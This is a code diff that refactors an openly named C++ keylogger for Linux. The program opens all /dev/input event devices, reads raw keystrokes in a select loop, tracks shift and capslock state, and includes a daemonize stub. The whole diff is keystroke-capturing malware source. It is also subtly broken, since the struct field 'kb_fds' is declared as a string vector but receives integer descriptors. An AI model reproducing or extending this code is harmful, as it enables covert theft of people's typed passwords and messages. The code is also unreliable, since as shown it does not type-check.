@@ -19,7 +19,7 @@
 struct keylogger_ctx {
   bool is_capslock_on;
   bool is_shift_pressed;
-  std::vector<std::string> kb_files;
+  std::vector<std::string> kb_fds;
   std::vector<char> kb_buffer;
   int buffer_cursor;
   struct input_event event;
@@ -113,14 +113,16 @@ std::vector<std::string> get_event_files() {
   return content;
 }
 
-std::vector<std::string> get_keyboard_files() {
-  std::vector<std::string> kb_files;
+std::vector<int> get_keyboard_fds() {
+  std::vector<int> fds;
 
   for (auto &event : get_event_files()) {
-    kb_files.emplace_back("/dev/input/" + event);
-  }
+    int fd = open(std::string("/dev/input/" + event).c_str(), O_RDONLY);
+ 
+    fds.emplace_back(fd);
+ }
 
-  return kb_files;
+  return fds;
 }
 
 
@@ -212,30 +214,23 @@ void handle_arrow(struct keylogger_ctx *ctx) {
 }
 
 int run(struct keylogger_ctx *ctx) {
-  std::vector<int> fds;
   struct input_event ev;
   fd_set rfds;
-
-  for (auto &file : ctx->kb_files) {
-    int fd = open(file.c_str(), O_RDONLY);
-
-    fds.emplace_back(fd);
-  }
 
   while (!must_stop) {
     FD_ZERO(&rfds);
 
-    for (auto &fd : fds) {
+    for (auto &fd : ctx->kb_fds) {
       FD_SET(fd, &rfds);
     }
 
-    int ret = select(*(fds.end() - 1) + 1, &rfds, nullptr, nullptr, nullptr);
+    int ret = select(*(ctx->kb_fds.end() - 1) + 1, &rfds, nullptr, nullptr, nullptr);
 
     if (ret == -1) {
       continue;
     }
 
-    for (auto &fd : fds) {
+    for (auto &fd : ctx->kb_fds) {
       if (FD_ISSET(fd, &rfds)) {
         int n_bytes = read(fd, &ev, sizeof(struct input_event));
 
@@ -254,7 +249,7 @@ int run(struct keylogger_ctx *ctx) {
 
   }
 
-  for (auto &fd : fds) {
+  for (auto &fd : ctx->kb_fds) {
     close(fd);
   }
 
@@ -265,7 +260,7 @@ void deamonize() {}
 
 int main() {
   struct keylogger_ctx ctx = {.is_capslock_on = false,
-                              .kb_files = get_keyboard_files(),
+                              .kb_fds = get_keyboard_fds(),
                               .buffer_cursor = 0};
 
   std::signal(SIGINT, sig_handler);
